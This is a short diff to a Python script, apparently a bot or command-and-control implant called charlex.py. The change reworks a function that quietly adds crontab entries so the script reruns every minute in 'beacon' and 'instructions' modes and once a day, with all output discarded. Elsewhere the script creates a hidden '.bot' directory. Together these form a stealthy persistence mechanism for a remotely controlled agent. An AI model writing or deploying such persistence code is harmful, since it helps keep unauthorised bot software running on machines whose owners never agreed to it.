@@ -6,13 +6,15 @@ import requests
 from datetime import datetime
 import time
 
-
-##checking to see if directory exists and making directory on new machine
+# 
 def cronjobs():
-	os.system('(crontab -l 2>/dev/null; echo "0 12 * * * /root/charlex.py >/dev/null >/dev/null 2>&1") | crontab -')
-	os.system('(crontab -l 2>/dev/null; echo "* * * * * /root/charlex.py beacon >/dev/null >/dev/null 2>&1")| crontab -')
-	os.system('(crontab -l 2>/dev/null; echo "* * * * * /root/charlex.py instructions >/dev/null >/dev/null 2>&1")| crontab -')
-
+	whoami = os.getcwd()+"/charlex.py"
+	start = '(crontab -l 2>/dev/null; echo "0 12 * * * '+whoami+'  >/dev/null >/dev/null 2>&1") | crontab -'
+	beacon = '(crontab -l 2>/dev/null; echo "* * * * * '+whoami+' beacon >/dev/null >/dev/null 2>&1")| crontab -'
+	instructions = '(crontab -l 2>/dev/null; echo "* * * * * '+whoami+' instructions >/dev/null >/dev/null 2>&1")| crontab -'
+	os.system(start)
+	os.system(beacon)
+	os.system(instructions)
 def directoryhandler():
 	dir = os.path.join('./','.bot')
 	if not os.path.exists(dir):
